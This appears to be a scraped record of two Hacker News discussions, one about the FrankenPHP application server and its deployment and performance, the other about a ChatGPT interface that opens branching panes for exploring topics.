it being very quick and smooth using apt-get. I don't recall doing anything else other than restarting apache. reply augustohp 5 hours agoparentprevI agree. If we can start a culture of relying on SQLite instead of PostgreSQL/MySQL, a whole server-side application can be a simple standalone binary. Also, having a binary makes it easy to bundle in an Electron app. reply francislavoie 3 hours agorootparentLaravel is defaulting to SQLite now (mainly for ease of development). Also FrankenPHP has SQLite included by default. Going that route is less scalable though, obviously, unless you use one of those third party SQLite cluster solutions. reply KronisLV 13 hours agoparentprev> ...instead of the older LAMP which can require somewhat complex Apache configuration. Is it really that bad? The Apache configuration seems decent with something like PHP-FPM: https://news.ycombinator.com/item?id=40256843 LoadModule proxy_fcgi_module \"/usr/lib/apache2/modules/mod_proxy_fcgi.so\"SetHandler \"proxy:fcgi://127.0.0.1:9000\"Here's a more full example of Nginx that's quite conceptually similar to how one would configure Apache, with installing the prerequisite packages: https://news.ycombinator.com/item?id=37443911 There are also prebuilt container images that you can use to achieve similar results, this is just in case you want to do it yourself and have a look at what's under the hood a bit more. In my eyes, that's certainly easier than configuring the Java app servers of old, like doing manual Tomcat or GlassFish configuration or whatever people spent time on back then. A single run command will usually be better regardless of the environment, but LAMP isn't all that bad either, when compared to the other stacks out there. reply pathartl 12 hours agoparentprevI cut my teeth as a WordPress dev and left the scene for .NET when it was still popular to use Vagrant to setup your dev environment. While I'm glad things have progressed since then, I have a trauma response to those days. The amount of hours spent getting a proper config with XDebug setup (oh god, what an absolute backwards-ass nightmare) was substantial. reply sandreas 13 hours agoprevWhile I often use the PHP integrated webserver during development: php -S 0.0.0.0:8000 public/index.php it is single threaded, slow and therefore not made for production environments. FrankenPHP looks promising, while the issue with limited Cores / Threads[2] seems also to be a problem when using it in production. However, maybe I'll give it a go for my pure-todo[1] project and see, if it suffers the same problem. The docker image as base looks really promising. Thanks for sharing. 1: https://github.com/sandreas/pure-todo 2: https://github.com/dunglas/frankenphp/discussions/294 reply lpapez 11 hours agoparentThe PHP built-in server is explicitly stated not for production use, and is intended for development purposes only. See the warning at the top of the page: https://www.php.net/manual/en/features.commandline.webserver... Not sure it's even fair to consider it for comparison in this context. reply sandreas 10 hours agorootparentThat's what I meant. But tbh I don't think FrankenPHP is ready for Produktion yet, although it might geht there some day. Just wanted to mention that using PHP locally, for simple app development you don't need a full fledged nginx, Apache or caddy in all cases reply rakoo 4 hours agoparentprev> not made for production environment Out of curiosity, is the performance the only blocker for putting this in prod ? If I were to have a small site, intended for a small number of users, what would I miss from other \"prod-ready\" environments ? reply slim 4 hours agorootparentit's really just for testing. Like for example you can't have a \".\" (dot) in a URL because it would be interpreted as a static file. reply rakoo 4 hours agorootparentOk, that's a good thing. I'm more interested in arguments than in \"it's just for testing\", because the latter doesn't indicate what's the problem (and what prod-ready solutions solve) reply PetahNZ 11 hours agoparentprevYou can set PHP_CLI_SERVER_WORKERS to make it run multiple threads. reply sandreas 10 hours agorootparentNEAT, didn't know that. Would still not use it in production :) reply pierstoval 8 hours agorootparentFrankenPHP is just Caddy + PHP, but in one binary. The threads thing, the worker mode, etc., all of it is optional, but basic Caddy + PHP is already production-ready, I've been using this kind of setup for a while, and switching to FrankenPHP when you already have Caddy is completely harmless. The only thing FrankenPHP does not is providing multiple versions of PHP in the same binary. For that, I'd still use Caddy + PHP-FPM, and it's fine. reply 20after4 12 hours agoparentprev>it is single threaded, slow and therefore not made for production environments. I'm pretty sure that this solves those specific issues (and more) reply NorwegianDude 13 hours agoprevI tried it and found it to be really slow, not even using my cores properly. Spent some time in the lacking docs and didn't figure it out... It says production ready with just a few commands and states 3,5 times the performance of fpm, but it's running at like 1 % of the performance of fpm for me. I also tried the executable, same issue. Was expecting at least 200K rps for hello world... reply kdunglas 12 hours agoparentHi, FrankenPHP author here. We would very much appreciate a reproducer. According to most benchmarks, FrankenPHP is generally much faster (~3 times) than FPM when worker mode is enabled, but there are still some outliers, and we're working with PHP maintainers to fix them. reply geenat 13 hours agoparentprevWould appreciate sharing your experience so we can get this addressed: https://github.com/dunglas/frankenphp/discussions/294 It's really awkward because Caddy by itself performs very well with PHP. reply geenat 14 hours agoprevhttps://github.com/dunglas/frankenphp/discussions/294 Has perf issues. Otherwise it's a really promising project. reply withinboredom 12 hours agoparentIf I could reproduce it, Iâ€™d happily take two weeks off from work and fix it. Nobody has mentioned how to reproduce it. reply dang 15 hours agoprevRelated: FrankenPHP, an app server for PHP written in Go - https://news.ycombinator.com/item?id=33205282 - Oct 2022 (83 comments) reply infogulch 14 hours agoparentAlso, on the homepage today, which may have been inspiration: Caddy 2.8 - https://news.ycombinator.com/item?id=40517576 reply gnabgib 15 hours agoparentprevAnd Package PHP apps as standalone, self-executable binaries (29 points, 5 months ago, 7 comments) :D [0]: https://news.ycombinator.com/item?id=38569637 reply mg 13 hours agoprevdocker run -v $PWD:/app/public -p 443:443 \\ dunglas/frankenphp If you want to build a docker container yourself that you can use to serve your app, then running these commands should do the trick to turn a fresh Debian into the container you need: apt install -y apache2 libapache2-mod-php cat/etc/apache2/sites-enabled/000-default.conf ServerName mysite.localAllowOverride All DocumentRoot /app/publicEOF Friends and I maintain a repo which shows how to go from zero to a running web application via popular languages and frameworks here: https://github.com/no-gravity/web_app_from_scratch reply lnxg33k1 12 hours agoparentI started working a month ago for a company using mod_php, it's painful, every time you start xdebug, then after the debugging session, you need to restart apache, I started yesterday configuring apache2 to use php-fpm, but I was just wondering if it could work for us, at least in dev, this frankenphp, just can't find how to install php-exts in the docs reply johnchristopher 12 hours agoparentprevUnless I am mistaken this won't work: does default apache 000-default.conf vhost redirect traffic from 443 to 80 ? reply mg 12 hours agorootparentTo support SSL you would add a virtual host section like this:ServerName mysite.local SSLEngine on SSLCertificateFile /path/to/cert SSLCertificateKeyFile /path/to/key DocumentRoot /app/publicAnd either use a real cert or add a command to create a self signed one: openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout key -out cert reply CoolCold 13 hours agoprevI've tried to do Wordpress benchmark under FrankenPHP and under Apache's Mod-PHP - I couldn't see evidence of winning for FPHP. Have not dug deep enough though and test was in Docker, not on normal setup. Wordpress was basically in default setup - no heavy themes or anything of this sort, not very realistic case too. Still want to repeat test and understand it better. reply kdunglas 12 hours agoparentUnlike Laravel and Symfony, WordPress doesn't support the worker mode of FrankenPHP (yet?), so there are not many benefits in terms of performance (except the ability to preload assets using 103 Early Hints, which can reduce the latency of a page load by 30%). That being said, FrankenPHP makes it easy to enable HTTP cache with WordPress and simplifies the deployment story. There is a dedicated project for WordPress and FrankenPHP, that comes with a built-in HTTP cache tailored for WordPress (using the Souin Go library): https://github.com/StephenMiracle/frankenwp reply CoolCold 7 hours agorootparent> Unlike Laravel and Symfony, WordPress doesn't support the worker mode of FrankenPHP (yet?), so there are not many benefits in terms of performance (except the ability to preload assets using 103 Early Hints, which can reduce the latency of a page load by 30%). This part is clear for me, but thank you for mentioning HTTP 103 too. I will not state for sure, but in my blurry memory, FPHP (FrankenPHP) was _slower_ than Apache+mod_php in that tests. But again, I won't say for sure, I just remember I was totally impressed as was expecting otherwise - much likely some subtle differences in setup on my side. If/when I have more precise info - I may ping you. > That being said, FrankenPHP makes it easy to enable HTTP cache with WordPress and simplifies the deployment story. There is a dedicated project for WordPress and FrankenPHP, that comes with a built-in HTTP cache tailored for WordPress (using the Souin Go library): https://github.com/StephenMiracle/frankenwp Thank you, have not seen that yet - may get idea or two from it. At glance, they just do naive `BYPASS_PATH_PREFIX` handling and that's all. Beyond tests, I of course do prefer Nginx over Caddy and \"simplifies the deployment story\" doesn't resonate with my needs much yet - one of that things may change of course. reply mhitza 13 hours agoparentprevMaybe you're using that name because you're accustomed to, but as a standard you should be using proxy_fcgi with Apache. Should squeeze out a bit of extra memory out of Apache and leave room for more PHP requests. reply CoolCold 8 hours agorootparentNot sure where you take this \"standard\" from - AFAIR, it was mod_php since ~ 2004-2005 and all that lovely mpm_prefork stuff. FastCGI and FPM came a bit later. > should be using proxy_fcgi with Apache I'd in general use Nginx instead of Apache, until .htaccess handling is needed - which is still a thing in shared hosting and around area mostly from my perspective - if you really care about \"squeeze out a bit of extra memory\" of course. reply pachico 13 hours agoprevI enjoy seeing this in the front page of HN. My feeling is that FPM and its share nothing arquitecture has been both the key of PHPs success many years ago but also its condemnation. reply samuell 2 hours agoprev\"Build standalone, self-executable and dependencies-free binaries for your PHP web applications, and command-line tools.\" I'm sold. reply oksteven 11 hours agoprevI have been looking for something like this for a while; it's great to see one now. My current approach is to use nginx container as a proxy to another container which run php-fpm, I don't think it's efficient enough. I'll try Frankenphp and see if it can do better. reply lnxg33k1 5 hours agoprevCould you integrate the documentation, or point me where it is explained, how to add php extensions? Like xdebug, opcache, etc? If there is something like docker-php-ext-install? Please, thank you reply hu3 4 hours agoparentThis should help: https://frankenphp.dev/docs/docker/#how-to-install-more-php-... reply lnxg33k1 2 hours agorootparentThank you! reply blixt 11 hours agoprevReminds me of that time 10 years ago when I tried to make Go more like PHP instead of the other way around: https://github.com/blixt/go-pher More seriously, happy to see worker mode in this server. PHP does come with several performance downsides, though Iâ€™m sure a lot of them have been worked around in the past decade. I donâ€™t think Iâ€™d do PHP again though if Iâ€™m being honest. reply pseudosavant 10 hours agoparentThere seem to be a lot of us with this PHP sentiment. PHP is like a girlfriend you lived with that was easy going and super cool at first...but by the end she might have been trying to poison you. She's been to therapy since and doing really awesome, but how could you ever go back right? Like, I'm really happy for the (many) remaining PHP devs that it isn't the shitshow it got to be around PHP6. But it could never tempt me back. Deno, Django, Go, dotnet...plenty of other fish in the sea. reply thomasfromcdnjs 12 hours agoprevIt would seem that this is more or less an alternative to Octane but I don't understand why there is documentation to also run Octane -> https://frankenphp.dev/docs/laravel/#laravel-octane/ Why would you run both? reply francislavoie 11 hours agoparentIt's not an \"alternative\", FrankenPHP is one of the 3 available drivers for Octane. See the Laravel docs https://laravel.com/docs/11.x/octane Octane is basically Laravel's branding for its \"worker mode\", i.e. running a long-running process which boots the framework and then processes requests, without needing to reboot the framework on every request. reply thomasfromcdnjs 11 hours agorootparentThanks for the answer. So you would turn on Frankens worker mode to sit on top of Laravel Octanes workers? My understanding is that Franken keeps the app running so Laravel wouldn't need to restart anyway? reply francislavoie 11 hours agorootparentNo, you use Octane to run FrankenPHP. Octane will download and run FrankenPHP for you. FrankenPHP is a program which has a webserver (Caddy) and PHP built-in, and worker mode allows it to run a pool of workers which have your Laravel app bootstrapped (all your service providers, middleware, controllers ready to go in memory) and then FrankenPHP feeds it requests as they come in. reply kuekacang 3 hours agorootparentTo add, octane does a trick that, frow what i grasp from reading the source, it cap for a total of n request (200?) and kill the worker to preemptively free up ram reply yurishimo 11 hours agoparentprevThe Go container provides an environment in which to run Octane. Your webserver still needs to know to reroute traffic appropriately. You can think of FrankenPHP as more of a webserver/app server all bundled into one binary. reply alberth 15 hours agoprevIs this just Caddy + PHP? reply WillyOnWheels 14 hours agoparentIt's basically a Caddy plugin that works as a drop in replacement for php-fpm, created by https://news.ycombinator.com/threads?id=kdunglas reply francislavoie 13 hours agorootparentI wouldn't really call it a drop-in replacement for php-fpm. It's more like emulating the way Apache+PHP was run traditionally, i.e. PHP is closer to the webserver instead of being a separate piece as it is with php-fpm (and needing fastcgi as protocol glue). But yes, from a practical standpoint, your PHP apps should _just work_ if you run it with this instead of php-fpm, provided that you aren't doing anything weird. If you're using a modern PHP framework (e.g. Laravel, Symfony) then you can use FrankenPHP's worker mode which is a huge boost in performance by keeping workers running which have the framework already warmed up and ready to accept requests right away, instead of having to boot the framework on every request. reply CodeCompost 13 hours agorootparentprevWhat is the Go part? It's a PHP interpreter or is PHP still doing all the work? reply francislavoie 13 hours agorootparentGo is acting as the process manager for PHP (either keeping a pool of workers running, or directly invoking PHP via CGO), and as the HTTP/HTTPS server (Caddy, obviously), ACME automation, etc. It's not a \"PHP interpreter\", it's literally PHP itself (written in C, compiled in with CGO). reply ThinkBeat 11 hours agoprevDoes this still require running Nginx as a reverse proxy in front of it? reply withinboredom 11 hours agoparentNo, and I'd recommend not doing so unless you need to. Caddy/FPHP supports https3 out of the box, and I don't think nginx does (at least the versions currently packaged in major distros). reply elitepleb 11 hours agoparentprevthis runs caddy (another famous reverse proxy) for you reply timvdalen 10 hours agoprevWhat does it mean to get rid of PSR-7 in today's age? Do people really miss $_GET and $_POST? reply kdunglas 10 hours agoparentThis means that in addition to any PSR-7 implementation, you can run apps using HttpFoundation (Symfony, Laravel, Drupal, etc) and \"legacy\" code using superglobals without the need for an adapter. reply timvdalen 9 hours agorootparentIn that case I think I'm missing the value prop here, doesn't that also hold for plain old php-fpm? reply kdunglas 5 hours agorootparentThat's not the case with other engines able to keep the booted app in memory to handle several requests (FPM doesn't support this). reply jumperabg 12 hours agoprevAre there any benefits on running WordPress on top of FrankenPHP? reply withinboredom 11 hours agoparentNot yet. It's possible when combined with some multi-site features of WordPress, an mu-plugin could enable worker mode with WordPress. Though, I'd have to contact my old employer (Automattic) to ask if they would be ok with me using an approach used on WordPress.com, which I'm fairly certain is a 'trade secret.' reply francislavoie 11 hours agoparentprevYou won't notice much performance benefit (because WordPress doesn't support worker mode yet), but it is simpler to run and deploy (single binary) and you get all the benefits of Caddy out of box too, like TLS automation. reply 63 13 hours agoprevInteresting for sure. My current setup is your basic nginx, fastcgi, php-fpm. I have some custom ngnix config though and I wouldn't want to have to switch web servers. I guess I could still use nginx as a reverse proxy and point it to this but then what's the point? I'll look into it for future projects where I really just need a simple php deployment, but for my needlessly complex project I'm already working on, I don't think it fits. reply chuckreynolds 14 hours agoprevoooh interesting. been a min since i've needed a php + WP setup but... not bad. reply ofrzeta 11 hours agoprevAlternatives are: - Roadrunner https://roadrunner.dev/ (also written in Go) - Swoole https://www.swoole.com/ https://openswoole.com/ See https://laravel.com/docs/11.x/octane for Laravel specific framework integration. reply francislavoie 11 hours agoparentIt's only an alternative if you're running a framework which also supports those (your PHP app has to be set up in a specific way for Roadrunner or Swoole to be usable). FrankenPHP has the advantage of working with _any_ PHP app (even WordPress) because it's just PHP, but compiled into a Go program with CGO. But it also has a worker mode which makes it behave similarly to those two. reply rustatian-me 1 hour agorootparentYou don't need any framework or specific web-server to use RoadRunner. RoadRunner can be used with any modern framework, or let's say naked, using only the PSR-7 (which is framework-agnostic) worker for HTTP, but: RR is not only HTTP, it is waaaay above that: Temporal.io support, various queue drivers, gRPC, TCP, KV, Native WebSockets/Broadcast support, distribute locks (without PHP extensions), etc. RR doesn't need to be somehow specifically set-up. Nothing special, download -> use :) reply francislavoie 1 hour agorootparentPSR-7 is framework agnostic, but not all PHP apps are PSR-7 ready. E.g. WordPress. That's the distinction. You can't just point Roadrunner at any PHP script or legacy PHP app and expect it to just run, but you can with FrankenPHP. reply rustatian-me 1 hour agorootparentSure, RR can't serve legacy PHP or WordPress (actually can, but that's not released yet), that's true. But the modern PHP ecosystem leaves lesser and lesser such a non-compatible scripts ;) reply ofrzeta 11 hours agorootparentprevAh, I didn't get that. Thanks for the clarification. reply klaussilveira 8 hours agoparentprevAlso: - ngx-php: https://github.com/rryqszq4/ngx-php - Workerman: https://github.com/walkor/workerman - ReactPHP: https://reactphp.org And the most recent benchmarks: https://www.techempower.com/benchmarks/#section=test&runid=0... reply zmxz 11 hours agoprevThere are claims this is faster. It's not. I used it, together with other \"alternative\" runtimes which are just PHP command line interface long running scripts with some sort of task distribution balancer in front. Just like PHP-FPM is. The apparent speedup comes from the fact it's not shared-nothing, meaning that objects from previous requests (and variables) are persisted and present in subsequent requests. This makes it work exactly like Node.js, removing the wonderful part of PHP which is that it automatically cleans up all the crap devs created and creates clean slate when next request is to be executed. All of these \"alternative\" runtimes are false positives, because they're quick for first few requests but get slower and slower for the subsequent ones. Then, the workers are killed and restarted (precisely what PHP-FPM does too). Since there's no new engine behind executing PHP, the only way FrankenPHP (and others) can yield any performance is when they're benchmarked against misconfigured PHP-FPM (opcache off, JIT off, persistent connections off). It's not my cup of tea. I like that there are attempts at doingbut turning PHP execution model into Node.js execution model isn't the way to go. I find it cheaper to throw a few bucks at stronger hardware compared to risking accurate execution to become flaky because shared-nothing is now unavailable. reply withinboredom 11 hours agoparentThe right answer, as always, is: \"it depends.\" There's no definitive \"faster\" or \"slower\" anything and the claim is \"up to\" not \"you will get.\" Some workloads won't see any benefits, others will. While your anecdata might be useful, it is just that, an anecdote. reply zmxz 10 hours agorootparentIt doesn't even depend. The underlying engine that executes opcodes is the same. Minimal speedup from not having to execute several \"new objectname\" commands isn't even a drop in the sea when it comes to what servers do. I, for one, would love to be wrong about this and that FrankenPHP with all the other alternative runtimes actually brought benefits. reply withinboredom 10 hours agorootparentIt absolutely does depend and \"several new\" might be \"thousands new\". It literally depends on what you're doing. > The underlying engine that executes opcodes is the same. Not exactly. FrankenPHP uses a ZTS build of PHP, which includes thread-support. Meaning you can actually spawn real-life threads in your PHP code with just a bit of work. I've actually been working on a Parallel drop-in replacement that uses FrankenPHP/go instead of maintaining its own thread system. reply notpushkin 14 hours agoprev [â€“] > Copy your PHP files in the document root, thatâ€™s all! sigh reply c0wb0yc0d3r 14 hours agoparent [â€“] How would you prefer it to work? reply darylteo 14 hours agorootparent [â€“] If I understand the top-poster's issue correctly: https://frankenphp.dev/docs/ docker run -v $PWD:/app/public \\ -p 80:80 -p 443:443 -p 443:443/udp \\ dunglas/frankenphp This mounts the current working directory into \"public\". Meaning, all .git, .env etc. will be publicly accessible. Better form would be to mount a $PWD/src directory instead. The documentation needs to be updated better for newbies. Generally ill-advised. Documentation just needs better updating or warnings. Very dangerous to inexperienced devs. In comparison the Laravel integration, it instructs the following: https://frankenphp.dev/docs/laravel/ docker run -p 80:80 -p 443:443 -p 443:443/udp -v $PWD:/app dunglas/frankenphp While all the sensitive files are mounted in, they have to be to function properly. In this case, they're mounted to a more secure context. reply withinboredom 12 hours agorootparentIt literally says â€œcopy your PHP filesâ€ note the PHP part. It doesnâ€™t say copy all your secrets and git history too. reply huimang 11 hours agorootparentIf you run the above docker command, which is directly from the docs, it copies everything inside of your current working directory. Not just PHP files. reply withinboredom 11 hours agorootparentThat docker command isn't \"copying\" anything; it's mounting, and I really hope people aren't doing that in production. There's a separate section on running in production. reply notpushkin 9 hours agorootparentProduction deployment guide also suggests copying everything (`COPY . /app/public`). https://frankenphp.dev/docs/production/ reply floflophp 9 hours agorootparentYour .dockerignore is supposed to filter out for you. In the Symfony default implementation, you have this file you can use: https://github.com/dunglas/symfony-docker/blob/main/.dockeri... reply notpushkin 9 hours agorootparentprev [â€“] My primary concern is actually that you have to store code in a directory that is publicly served by default. I haven't looked into the PHP world lately, but I have assumed that by now most PHP frameworks would store code (and associated configs etc) outside the document root, like the Laravel approach you mentioned. reply c0wb0yc0d3r 1 hour agorootparentI see what you mean. I interpreted the getting started one-liner differently. I took it to mean that the docker container is serving from `/app/public` and the user needs to mount their files accordingly. reply francislavoie 3 hours agorootparentprev [â€“] Yeah, most modern PHP frameworks use a public/ directory which has the index.php entrypoint in it, and any static assets are served from in there (JS/CSS/images) if necessary. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "FrankenPHP is a modern PHP application server written in Go, integrating the official PHP executor with the Caddy web server, and supporting HTTP/1.1, HTTP/2, HTTP/3, and automatic HTTPS certificates.",
      "Key features include worker mode for enhanced performance, compatibility with popular PHP frameworks, support for modern compression formats, built-in Prometheus metrics, structured logging, and real-time event handling via a Mercure hub.",
      "Designed for cloud-native environments, FrankenPHP is easy to deploy as a Docker image or standalone binary, led by KÃ©vin Dunglas, with design by Laury Sorriaux and sponsorship from Les-Tilleuls.coop."
    ],
    "commentSummary": [
      "FrankenPHP is a modern PHP application server that integrates PHP within a Go server, simplifying deployment into a single binary, appealing to developers for its user-friendly design.",
      "The discussion highlights the pros and cons of PHP and Go for web development, with PHP known for ease of use and built-in features, while Go is praised for scalability, security, and error handling.",
      "Despite its potential, FrankenPHP faces criticism for its complex build process, performance issues, and lack of worker mode support, indicating a need for further refinement and better documentation."
    ],
    "points": 389,
    "commentCount": 180,
    "retryCount": 0,
    "time": 1717038632
  },
  {
    "id": 40522844,
    "title": "New ChatGPT UI Enhances Rabbit Hole Exploration with Tiling Layout and Hyperlink Prompts",
    "originLink": "https://delve.a9.io/",
    "originBody": "I was inspired by the way ChatGPT writes bullet lists, then invites you to \"delve\" deeper.This is an interface that reifies that rabbit-holing process into a tiling layout. The model is instructed to output hyperlink-prompts when it mentions something you might want to delve into.Lots of features to add (sessions, sharing, navigation, highlight-to-delve, images, ...). Would love to hear other usecases and ideas!",
    "commentLink": "https://news.ycombinator.com/item?id=40522844",
    "commentBody": "ChatGPT UI for rabbit holes (a9.io)356 points by maxkrieger 6 hours agohidepastfavorite87 comments I was inspired by the way ChatGPT writes bullet lists, then invites you to \"delve\" deeper. This is an interface that reifies that rabbit-holing process into a tiling layout. The model is instructed to output hyperlink-prompts when it mentions something you might want to delve into. Lots of features to add (sessions, sharing, navigation, highlight-to-delve, images, ...). Would love to hear other usecases and ideas! gfiorav 4 hours agoThis is very good. I can't put my finger on it, but it seems more important than a mere \"gimmick.\" I noticed that if you click on a topic already explored, it won't open again. That's cool, I'd make it snap back to the pane where it's open. Kudos! This is an interesting perspective on how we really need to put a little more effort into the UX of LLMs. reply eganist 3 hours agoparent> I can't put my finger on it, but it seems more important than a mere \"gimmick.\" Let me see if I can articulate it. You know how a human conversation can have multiple threads? And ten minutes in, you find the topic has totally changed and you're trying to figure out the original topic? Sometimes you can get back to it, sometimes you can't, right? Obviously it's not quite the same when you can see prompt history, but the conversation is still pretty linear. This pre-empts that problem by letting you fork thoughts. reply hazn 40 minutes agorootparentalso beautiful feature of nested comment threads, like this very orange site :) reply mylons 4 hours agoparentprevi honestly don't get it. what's even different about it than chatGPT? reply Gracana 4 hours agorootparentIt's like following the links in wikipedia, but each link is a new chatgpt window to interact with. reply soegaard 4 hours agorootparentprevClick the links. reply mylons 3 hours agorootparentoh -- it wasn't really obvious they were links. i think i assumed that because i'm used to the chatGPT ui. reply Eldt 3 hours agorootparentThey have the underline usually associated with hotlinks reply alexvitkov 2 hours agorootparentIt's a light grey dotted line under a black bold text, it's not impossible to miss. reply pwython 1 hour agorootparentFunny, I was just thinking yesterday about how back in '90s, ALL links were blue with an underline (or purple if you've visited it). reply avarun 55 minutes agorootparentNot all, but the vast majority yes, because nobody bothered styling links with CSS. reply LordDragonfang 1 hour agorootparentprevThe dotted underline is usually reserved for indicating alt text or hover content, actually. In this case, I think it's fine to be dotted, since it's not a true hyperlink, but combining that with it being the same text color is just bad from a semantic POV. It's made worse by the fact that the author apparently decided to make visited links blue. (Edit: apparently it's \"active\" panes, not visited, but semantically similar) @maxkrieger if you're reading this, please consider making unvisited links blue, to conform to the universal semantics everywhere else on the web, and make visited links either purple, or black if you really want. (edit: or some different color for active panes. Green?) reply SubiculumCode 1 hour agorootparentagreed..although, that's a more appropriate thing to critique to developing a production-ready product than a demo like this. reply GrinningFool 15 minutes agoprevThis is pretty great, provides a nice set of breadcrumbs for a deep dive into any rabbit hole. Once thing that threw me off was when I went to the original panel and clicked a second topic, it cleared out the panes that I had explored off the first topic. I had to discover they weren't really lost by re-clicking. I think it would be better if there was some visual indicator they were still there - perhaps the topic (and sub-topics) get collapsed but are still visible with the heading of the selected topic? reply wiremine 1 hour agoprevTaking a step back: The UX/UI for LLMs in general are very immature. We're in the very early days of to best interact with these tools. We need more experimentation like this to help figure out what works, and doesn't work. Kudos! reply glenstein 41 minutes agoparentI will say the bare bones chat interfaces are so so much better than the awful copilot side panes, and quasi-material designed to death Google attemps at interfaces so far. I am sure with multi-modal, and with special cases for deep research there may be improvements, but insofar as straight text chat is concerned I think the simplest interfaces are hard to improve upon. reply sleepingreset 53 minutes agoparentprevthere's a chrome extension, \"HLAI\" that's playing around with this idea, too reply spdustin 5 hours agoprevIf \"delve\" was meant to be an in-joke, I just wanted you to know: I got it. I also have a Custom GPT \"AutoExpert (Chat)\" [0] that several reviewers have called \"the perfect Rabbit Hole GPT\" due to the way it leads users through learning a topic. You might dig it, especially since free tier users have access to these now. [0]: https://chatgpt.com/g/g-LQHhJCXhW-autoexpert-chat reply voiper1 52 minutes agoparentWow, I find this very useful. The eliciting an expert, alternative experts, oppositional viewpoints... fascinating. We're just getting started on what we can do with LLMs! reply wrboyce 5 hours agoparentprevOh I like this! Love how easy it is to dig deeper. Worth noting that free users are rather restricted in their uses of custom GPTs so probably wonâ€™t be able to dig as deeply as theyâ€™d like. EDIT: Iâ€™ve now quizzed it about string theory, quantum mechanics, classic Roman pasta dishes, Italian wines, and sent it a picture of some poison hemlock and I think Iâ€™ve found my new favourite GPT. Great work! EDIT 2: asked it to critique a photo I took recently and that was great too, really impressed with this. reply jmkni 1 hour agoparentprevwhat's the joke? reply Matticus_Rex 1 hour agorootparentChatGPT overuses the word \"delve\" in its writing. Search your email for \"delve,\" and look at how common it starts becoming (esp. in marketing emails) around the time ChatGPT takes off. reply LordDragonfang 1 hour agorootparentNot just marketing emails: https://x.com/philipshapira/status/1774497589980742071?s=20 https://nitter.privacydev.net/philipshapira/status/177449758... reply mariocesar 5 hours agoprevLove it! I like that the site is straight to action, but I think it could really benefit from a walkthrough. Hereâ€™s an idea! It would be great if we had an introduction to the site right in the prompt! to help understand its main purpose right from the start. It'll be great if the first thing you see is [Explain what \"delve into\" is] as a prompt suggestion. Next, it will reply with, \"Itâ€™s for exploring topics deeply, similar to going down \"rabbit holes\" where one interesting thing leads to another. Here are some examples ...\" Then, you guide the user through the functions step-by-step. Something like, \"Click on option X to start a new thread, then choose from the suggested prompts or create your own. Follow the flow to see related threads and dive even deeper.\" reply dbish 4 hours agoparentMy 2 cents here is that itâ€™s less obvious that this would be a net positive, people fall into two camps on these type of getting started suggestions. Many will say this very guided walk through is an obvious useful feature, and many will say that it annoys them. Iâ€™ve gathered a lot of feedback on things like this for a few different sites and apps from senior UX designers and PMs who contradict eachother on improvements and best practices all the time and from users. Youâ€™ll of course only hear from the people who want it rather then the ones who would be annoyed by it :) Great project that seemed very easy to understand and straight forward to me, no further walk throughs needed ;) reply sleepingreset 52 minutes agorootparentperhaps consider a tutorial you can close with just one click? those always seem a good compromise reply dbish 37 minutes agorootparentcompromise, the father of all mediocre designs reply freedomben 1 hour agoprevWow, this is really neat! I usually don't comment on Show HN's because I'm rarely impressed by them and I don't want my lack of enthusiasm to be a detterent for people showing their work, but occasionally one like this comes up that is very cool. I also really appreciate that absence of tracking other than Cloudflare Insights (which seems very reasonable to me). There's an old truism in the business, that the more \"suggestions\" people give about your idea, the more they like it, and it's absolutely true. Solid work! Do you have plans to monetize and/or open source it? reply roldie 4 hours agoprevGreat idea. I also see inspiration from Andy Matuschak's notes [0], of which I'm a bit fan [0] https://notes.andymatuschak.org/zB74H9CuWrosEuqve7jZyCo?stac... reply dindobre 4 hours agoparentDamn, is there some SAAS like notion or an Obsidian plugin to be able to take notes like this? reply thepuppet33r 4 hours agorootparenthttps://forum.obsidian.md/t/andy-matuschak-mode/70 There's an Obsidian plug-in. reply mbil 5 hours agoprevThis is great and something that I've wished existed. Thanks for making it! Right now, the tiles are linear. E.g. if tile A links to tiles B and C, clicking either B or C will open a new tile directly next to A (and only one of B or C is visible at a time). What do you think about making more of a tree layout where B and C both branch from A and can be viewed simultaneously? reply bbor 7 minutes agoparentI think this is a point where itâ€™s helpful to take a step back in scope â€” instead of looking for LLM tree UI implementations, we should consider the mature field of general text hierarchies. Iâ€™m lazy, but I posit there are many, many UIs for visualizing wikilink-esque document repositories, such as obsidian plugins (?), browser extensions, vim/emacs/other plugins, etc. Personally, Iâ€™m a huge fan of a few principles that I hope to impose on the world via book, eventually: 1. Indices over keys. 2. No single set should have more than N elements, where N is usually 10 but could be 2/3/4 if youâ€™re doing decision trees, and could be 16 if youâ€™re insane and want to use hex indices. 3. Each element can be referenced locally with a simple index (`3`), or a full path made by concatenating the indices of its ancestors from the root (`053`). This would be an example of an â€œanalyticâ€ approach, as opposed to the ad-hoc â€œsyntheticâ€ approach of just visualizing whatever wikilink structure there happens to be. Thereâ€™s a huge space of solutions â€œbetweenâ€ these two - such as constraining the ad-hoc visualization to meta-tagged wikilink relations â€” but I think the dichotomy is useful. Personally, I prefer to use predesigned structures wherever possible for exactly these reasons. It makes automated visualization possible, in many casesâ€¦ An example would be reusing the same 3/4 12-element directory template for every SWE project. I hope itâ€™s clear how the same idea could be directly applied to a research project performed with lots of automated LLM queries. reply gbalduzzi 5 hours agoparentprevI agree with this. The UI is already great, but a tree-like structure would be awesome. reply shanusmagnus 4 hours agorootparentSeconded (or thirded) -- a way to navigate tree conversations is desperately needed. Perhaps something like what Gingko [1] does. [1] https://gingkowriter.com/ reply Hansenq 40 minutes agoprevI used to go down rabbit holes on Wikipedia all the time--could spend hours doing this. This to me seems like an Infinite Wikipedia! Really cool use-case! reply owenpalmer 28 minutes agoprevI really, really love this. Even after using it for just a few minutes, I'm sold. Excellent work, will it be open source at some point? reply owenpalmer 15 minutes agoparentOne critique is that I wish there was a feature to manually make a word highlighted. It's pretty good at figuring out where to branch, but for really lexically dense topics, it would be nice to specify it without needing to type in the chat. Perhaps a \"hover for definition\" feature would suffice, similar to Wikipedia. reply theflyestpilot 1 hour agoprevI've been craving a gpt ui where I could fork conversations that stem from a genesis thought. Put this on a canvas too so I can zoom out and look at the footprint I left to retrace my steps reply instagraham 1 hour agoprevThis could replace the hours I spend on Wikipedia. Hope it's not too expensive to run. reply maxkrieger 1 hour agoparentThanksChatGPT just keeps on vibrating the phone (iOS app) I'd hate that. YouTube turned on vibration (a subtle tap) for videos whenever it reached automatically generated \"key concepts\" in (some) videos, with no option to disable it[1] so I had to finally disable all vibration on the phone: Settings -> Accessibility -> Touch -> Vibration (off) [1] 